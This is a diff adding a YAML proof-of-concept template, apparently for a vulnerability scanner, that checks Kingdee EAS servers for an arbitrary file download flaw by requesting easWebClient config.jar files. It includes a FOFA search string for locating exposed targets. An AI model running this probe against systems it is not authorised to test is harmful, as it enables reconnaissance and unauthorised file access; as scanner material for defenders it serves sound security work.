@@ -1,0 +1,19 @@
+id: poc-yaml-kingdee-eas-easwebclient-anyfile-download
+info:
+  name: 金蝶 EAS easWebClient 任意文件下载漏洞
+  severity: high
+  tags:
+  - 两高一弱
+  - 文件读取
+  finger: 金蝶 EAS
+  fofa: body="easSessionId"
+variables:
+  url: 'easWebClient/bin/config.jar
+
+    easWebClient/bin/lib/config.jar'
+requests:
+- method: GET
+  path: /{{.url}}
+  expression: status_code == 200 && contains(body,"MANIFEST.MF") && contains(body,"kingdee/eas")
+    && contains(headers,"application/java-archive")
+transport: http
